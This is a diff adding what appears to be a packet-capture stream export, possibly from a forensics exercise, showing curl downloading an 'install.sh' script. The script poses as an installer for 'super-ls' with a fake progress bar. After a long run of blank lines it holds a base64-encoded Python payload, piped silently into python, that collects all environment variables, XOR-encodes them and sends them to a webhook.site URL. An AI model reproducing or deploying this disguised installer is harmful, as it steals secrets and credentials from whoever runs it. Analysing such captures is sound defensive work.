@@ -1,0 +1,105 @@
+
+===================================================================
+Follow: tcp,ascii
+Filter: tcp.stream eq 1
+Node 0: 10.89.0.5:33908
+Node 1: 88.99.137.18:80
+629
+GET /filebin/39ebdf30459113a609669da925444741e6679a923d2e5c68de8be4412c39b6a3/043df5bdbf6639d7a77e1d44c5226fd7371e5259a1e4df3a0dd5d64c30dca44f?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=7pMj6hGeoKewqmMQILjm%2F20250203%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250203T202657Z&X-Amz-Expires=60&X-Amz-SignedHeaders=host&response-cache-control=max-age%3D60&response-content-disposition=filename%3D%22install.sh%22&response-content-type=text%2Fplain%3B%20charset%3Dutf-8&X-Amz-Signature=e76f8125b931e5753049371fc554cac30f68a8c16d8bd26c759c1ca53cde8012 HTTP/1.1
+Host: s3.filebin.net
+User-Agent: curl/7.88.1
+Accept: */*
+
+
+	1420
+HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Cache-Control: max-age=60
+Content-Disposition: filename="install.sh"
+Content-Length: 1145
+Content-Type: text/plain; charset=utf-8
+ETag: "6740139bcd849859c4643dc94f89841b"
+Last-Modified: Mon, 03 Feb 2025 20:18:50 GMT
+Vary: Origin, Accept-Encoding
+X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
+X-Amz-Request-Id: 1820CC9A0633BC54
+X-Ratelimit-Limit: 18458
+X-Ratelimit-Remaining: 18451
+X-Xss-Protection: 1; mode=block
+Date: Mon, 03 Feb 2025 20:26:58 GMT
+X-Varnish: 531935785
+Age: 0
+Via: 1.1 varnish (Varnish/6.0)
+Access-Control-Allow-Origin: *
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Referrer-Policy: origin
+X-Content-Type-Options: nosniff
+X-Frame-Options: deny
+X-Report-Abuse: abuse@filebin.net
+Content-Security-Policy: script-src 'none'; script-src-elem 'none'; script-src-attr 'none'
+Connection: keep-alive
+
+#!/usr/bin/bash 
+
+echo "[+] Installing super-ls"
+cp /usr/bin/ls $HOME/.local/bin/super-ls
+echo -ne '#####                     (33%)\r'
+sleep 1
+echo -ne '#############             (66%)\r'
+sleep 1
+echo -ne '#######################   (100%)\r'
+echo -ne '\n'
+echo "[+] Installed super-ls :D"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+echo "ZnJvbSBjdHlwZXMgaW1wb3J0ICoKZnJvbSBiYXNlNjQgaW1wb3J0IGI2NGVuY29kZSBhcyBlCmltcG9ydCByZXF1ZXN0cyBhcyBpCmltcG9ydCBvcwpsaWJjID0gQ0RMTCgibGliYy5zby42
+	658
+IikKCmlpID0gc3RyKG9zLmVudmlyb24pLmVuY29kZSgpCgpkZWYgbygpOiAKICAgIGdsb2JhbCByCiAgICByID0gciAqIGludCgobGVuKGlpKSAvIGxlbihyKSArIDEpKQogICAgcmV0dXJuICIiLmpvaW4oY2hyKGMgXiBvcmQoY2MpKSBmb3IgKGMsIGNjKSBpbiB6aXAoaWksIHIpKQoKCmRlZiB4KCk6CiAgICBmb3IgXyBpbiByYW5nZSgxMzM3KTogeSA9IHN0cihsaWJjLnJhbmQoKSkKICAgIGdsb2JhbCByCiAgICByID0gZSgiIi5qb2luKFtjaHIoaW50KHlbaTppICsgMl0pKSBmb3IgaSBpbiByYW5nZSgwLCBsZW4oeSksIDIpXSkuZW5jb2RlKCkpLmRlY29kZSgpLnJlcGxhY2UoIj0iLCAiIikKCgoKCngoKQppLmdldChmImh0dHBzOi8vd2ViaG9vay5zaXRlLzJhYmM1NjViLTU2YTQtNDZhZC1hN2RjLTc0NmJhZDg1YjYyNj94PXtlKG8oKS5lbmNvZGUoKSkuZGVjb2RlKCl9IiwgdmVyaWZ5PUZhbHNlKQo=" | base64 -d | python 2>/dev/null >/dev/null
+
+===================================================================
